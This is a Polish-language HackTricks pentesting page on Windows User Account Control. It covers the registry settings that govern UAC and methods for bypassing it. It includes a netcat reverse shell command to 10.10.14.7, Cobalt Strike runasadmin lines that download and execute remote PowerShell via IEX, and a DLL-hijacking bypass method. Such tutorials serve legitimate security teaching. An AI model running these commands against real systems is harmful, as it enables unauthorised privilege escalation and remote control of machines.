# UAC - Kontrola kont użytkowników

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Kontrola kont użytkowników (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja umożliwiająca **wyświetlanie monitu o zgodę dla podniesionych uprawnień**. Aplikacje mają różne poziomy `integralności`, a program o **wysokim poziomie** może wykonywać zadania, które **mogą potencjalnie naruszyć system**. Gdy UAC jest włączone, aplikacje i zadania zawsze **działają w kontekście zabezpieczeń konta nieadministratora**, chyba że administrator wyraźnie autoryzuje te aplikacje/zadania do uzyskania dostępu na poziomie administratora do systemu. Jest to funkcja ułatwiająca, która chroni administratorów przed niezamierzonymi zmianami, ale nie jest uważana za granicę bezpieczeństwa.

Aby uzyskać więcej informacji na temat poziomów integralności:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Gdy UAC jest aktywne, użytkownik administratora otrzymuje 2 tokeny: standardowy klucz użytkownika, aby wykonywać zwykłe czynności na poziomie standardowym, oraz token z uprawnieniami administratora.

Ta [strona](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) omawia w szczegółach, jak działa UAC, w tym proces logowania, doświadczenie użytkownika i architekturę UAC. Administratorzy mogą używać zasad zabezpieczeń do konfigurowania sposobu działania UAC specyficznego dla swojej organizacji na poziomie lokalnym (za pomocą secpol.msc) lub skonfigurowanych i wdrożonych za pomocą obiektów zasad grupy (GPO) w środowisku domeny Active Directory. Różne ustawienia są omówione szczegółowo [tutaj](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Istnieje 10 ustawień zasad grupy, które można ustawić dla UAC. Poniższa tabela zawiera dodatkowe szczegóły:

| Ustawienie zasad grupy                                                                                                                                                                                                                                                                                                                                                       | Klucz rejestru               | Ustawienie domyślne                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Kontrola kont użytkowników: Tryb zatwierdzania administratora dla wbudowanego konta Administrator](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Wyłączone                                                    |
| [Kontrola kont użytkowników: Zezwalaj aplikacjom UIAccess na wyświetlanie monitu o podniesienie uprawnień bez użycia bezpiecznego pulpitu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Wyłączone                                                    |
| [Kontrola kont użytkowników: Zachowanie monitu o podniesienie uprawnień dla administratorów w trybie zatwierdzania administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Wymagaj zgody dla plików niebędących plikami systemowymi     |
| [Kontrola kont użytkowników: Zachowanie monitu o podniesienie uprawnień dla użytkowników standardowych](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Wymagaj poświadczeń na bezpiecznym pulpicie                  |
| [Kontrola kont użytkowników: Wykrywaj instalacje aplikacji i wyświetlaj monit o podniesienie uprawnień](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Włączone (domyślnie dla domu) Wyłączone (domyślnie dla przedsiębiorstwa) |
| [Kontrola kont użytkowników: Podnoszenie uprawnień tylko dla podpisanych i zweryfikowanych plików wykonywalnych](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Wyłączone                                                    |
| [Kontrola kont użytkowników: Podnoszenie uprawnień tylko dla aplikacji UIAccess zainstalowanych w bezpiecznych lokalizacjach](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Włączone                                                     |
| [Kontrola kont użytkowników: Uruchamiaj wszystkich administratorów w trybie zatwierdzania administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Włączone                                                     |
| [Kontrola kont użytkowników: Przełącz na bezpieczny pulpit podczas wyświetlania monitu o podniesienie uprawnień](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Włączone                                                     |
| [Kontrola kont użytkowników: Wirtualizuj niepowodzenia zapisu plików i rejestrów w lokalizacjach użytkownika](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Włączone                                                     |
### Teoria bypassowania UAC

Niektóre programy są **automatycznie podnoszone** do **wyższego poziomu uprawnień** jeśli **użytkownik należy** do **grupy administratorów**. Te pliki wykonywalne mają w swoim _**Manifestach**_ opcję _**autoElevate**_ ustawioną na _**True**_. Plik wykonywalny musi również być **podpisany przez Microsoft**.

Następnie, aby **obejść** UAC (podnieść się z poziomu **średniego** do **wysokiego**) niektórzy atakujący używają tego rodzaju plików wykonywalnych do **wykonywania dowolnego kodu**, ponieważ zostanie on wykonany z procesu o **wysokim poziomie uprawnień**.

Możesz **sprawdzić** _**Manifest**_ pliku wykonywalnego za pomocą narzędzia _**sigcheck.exe**_ z Sysinternals. A poziom uprawnień procesów można **zobaczyć** za pomocą _Process Explorer_ lub _Process Monitor_ (z Sysinternals).

### Sprawdź UAC

Aby potwierdzić, czy UAC jest włączone, wykonaj:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Jeśli jest to **`1`**, to UAC jest **aktywowane**, jeśli jest to **`0`** lub **nie istnieje**, to UAC jest **nieaktywne**.

Następnie sprawdź, **jaki poziom** jest skonfigurowany:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Jeśli **`0`**, to UAC nie będzie wyświetlać monitu (jak **wyłączone**)
* Jeśli **`1`**, administrator jest **proszony o nazwę użytkownika i hasło** w celu wykonania binarnego pliku z uprawnieniami administratora (na Bezpiecznym Pulpicie)
* Jeśli **`2`** (**Zawsze informuj mnie**), UAC zawsze będzie prosić administratora o potwierdzenie, gdy ten próbuje uruchomić coś z wysokimi uprawnieniami (na Bezpiecznym Pulpicie)
* Jeśli **`3`**, podobnie jak `1`, ale niekoniecznie na Bezpiecznym Pulpicie
* Jeśli **`4`**, podobnie jak `2`, ale niekoniecznie na Bezpiecznym Pulpicie
* Jeśli **`5`** (**domyślne**), administratora zostanie poproszony o potwierdzenie uruchomienia plików niebędących plikami systemowymi z wysokimi uprawnieniami

Następnie należy sprawdzić wartość klucza **`LocalAccountTokenFilterPolicy`**\
Jeśli wartość wynosi **`0`**, tylko użytkownik o RID 500 (**wbudowany Administrator**) może wykonywać zadania administratora bez UAC, a jeśli wynosi `1`, **wszystkie konta w grupie "Administratorzy"** mogą to robić.

Na koniec sprawdź wartość klucza **`FilterAdministratorToken`**\
Jeśli wartość wynosi **`0`** (domyślnie), wbudowane konto Administratora może wykonywać zadania administracyjne zdalnie, a jeśli wynosi **`1`**, wbudowane konto Administratora **nie może** wykonywać zadań administracyjnych zdalnie, chyba że `LocalAccountTokenFilterPolicy` jest ustawione na `1`.

#### Podsumowanie

* Jeśli `EnableLUA=0` lub **nie istnieje**, **brak UAC dla nikogo**
* Jeśli `EnableLua=1` i **`LocalAccountTokenFilterPolicy=1` , brak UAC dla nikogo**
* Jeśli `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` i `FilterAdministratorToken=0`, brak UAC dla RID 500 (wbudowany Administrator)**
* Jeśli `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` i `FilterAdministratorToken=1`, UAC dla wszystkich**

Wszystkie te informacje można uzyskać za pomocą modułu **metasploit**: `post/windows/gather/win_privs`

Możesz również sprawdzić grupy swojego użytkownika i uzyskać poziom integralności:
```
net user %username%
whoami /groups | findstr Level
```
## Bypass UAC

{% hint style="info" %}
Zauważ, że jeśli masz dostęp do graficznego interfejsu ofiary, bypass UAC jest prosty, ponieważ możesz po prostu kliknąć "Tak", gdy pojawi się monit UAC.
{% endhint %}

Bypass UAC jest potrzebny w następującej sytuacji: **UAC jest aktywowane, Twój proces działa w kontekście średniej integralności, a Twoje konto należy do grupy administratorów**.

Warto zaznaczyć, że **znacznie trudniej jest ominąć UAC, jeśli jest w najwyższym poziomie zabezpieczeń (Zawsze), niż w innych poziomach (Domyślny).**

### Wyłączony UAC

Jeśli UAC jest już wyłączone (`ConsentPromptBehaviorAdmin` to **`0`**), możesz **wykonać odwróconą powłokę z uprawnieniami administratora** (wysoki poziom integralności) używając czegoś takiego jak:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass za pomocą duplikacji tokena

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Bardzo podstawowy "bypass" UAC (pełny dostęp do systemu plików)

Jeśli masz powłokę z użytkownikiem należącym do grupy Administratorów, możesz **zamontować udział C$** za pomocą SMB (systemu plików) lokalnie na nowym dysku i będziesz mieć **dostęp do wszystkiego w systemie plików** (nawet do folderu domowego Administratora).

{% hint style="warning" %}
**Wygląda na to, że ten trik już nie działa**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass z wykorzystaniem Cobalt Strike

Techniki Cobalt Strike będą działać tylko wtedy, gdy UAC nie jest ustawione na maksymalnym poziomie zabezpieczeń.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** mają również kilka modułów do **omijania** **UAC**.

### KRBUACBypass

Dokumentacja i narzędzie dostępne na stronie [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Wykorzystanie podatności UAC

[**UACME**](https://github.com/hfiref0x/UACME) to **kompilacja** kilku wykorzystań podatności UAC. Należy pamiętać, że trzeba **skompilować UACME przy użyciu Visual Studio lub msbuild**. Kompilacja utworzy kilka plików wykonywalnych (np. `Source\Akagi\outout\x64\Debug\Akagi.exe`), trzeba wiedzieć, **który z nich jest potrzebny**.\
Należy **być ostrożnym**, ponieważ niektóre omijania spowodują **wyświetlenie alertu** przez inne programy, co zwróci uwagę **użytkownika**.

UACME zawiera informacje o **wersji kompilacji, od której zaczęła działać każda technika**. Można wyszukać technikę, która dotyczy danej wersji:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Dodatkowo, korzystając z [tej](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) strony, otrzymasz wersję systemu Windows `1607` na podstawie numeru kompilacji.

#### Więcej sposobów na obejście UAC

**Wszystkie** techniki używane tutaj do obejścia UAC **wymagają** pełnego interaktywnego powłoki z ofiarą (zwykła powłoka nc.exe nie wystarczy).

Możesz uzyskać to korzystając z sesji **meterpreter**. Przejdź do **procesu**, który ma wartość **Session** równą **1**:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ powinien działać)

### Ominięcie UAC za pomocą GUI

Jeśli masz dostęp do **interfejsu graficznego, możesz po prostu zaakceptować monit UAC**, gdy się pojawi, nie potrzebujesz go naprawdę obejść. Dlatego uzyskanie dostępu do interfejsu graficznego umożliwi Ci ominięcie UAC.

Ponadto, jeśli uzyskasz sesję interfejsu graficznego, którą ktoś używał (potencjalnie za pośrednictwem RDP), istnieją **niektóre narzędzia, które będą działać jako administrator**, z których można **uruchomić** na przykład **cmd** jako administrator bez ponownego pytania o UAC, takie jak [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). To może być nieco bardziej **ukryte**.

### Głośne obejście UAC metodą brute-force

Jeśli nie zależy Ci na hałasie, zawsze możesz **uruchomić coś takiego jak** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), które **prosi o podniesienie uprawnień, aż użytkownik je zaakceptuje**.

### Własne obejście - Podstawowa metodologia obejścia UAC

Jeśli spojrzysz na **UACME**, zauważysz, że **większość obejść UAC wykorzystuje podatność na Dll Hijacking** (głównie poprzez zapisanie złośliwej biblioteki DLL w _C:\Windows\System32_). [Przeczytaj to, aby dowiedzieć się, jak znaleźć podatność na Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).

1. Znajdź binarny plik, który będzie **automatycznie podnosił uprawnienia** (sprawdź, czy po uruchomieniu działa na wysokim poziomie integralności).
2. Za pomocą procmon znajdź zdarzenia "**NAME NOT FOUND**", które mogą być podatne na **Dll Hijacking**.
3. Prawdopodobnie będziesz musiał **zapisać** bibliotekę DLL w niektórych **chronionych ścieżkach** (takich jak C:\Windows\System32), gdzie nie masz uprawnień do zapisu. Możesz to obejść, korzystając z:
1. **wusa.exe**: Windows 7, 8 i 8.1. Pozwala na wyodrębnienie zawartości pliku CAB w chronionych ścieżkach (ponieważ narzędzie to jest uruchamiane na wysokim poziomie integralności).
2. **IFileOperation**: Windows 10.
4. Przygotuj **skrypt**, aby skopiować swoją bibliotekę DLL do chronionej ścieżki i uruchomić podatny i automatycznie podnoszący uprawnienia plik binarny.

### Inna technika obejścia UAC

Polega na obserwowaniu, czy **binarny plik autoElevated** próbuje **odczytać** z **rejestru** **nazwę/ścieżkę** **binarnego** lub **polecenia**, które ma zostać **wykonane** (jest to bardziej interesujące, jeśli plik wyszukuje tej informacji wewnątrz **HKCU**).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Uzyskaj [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
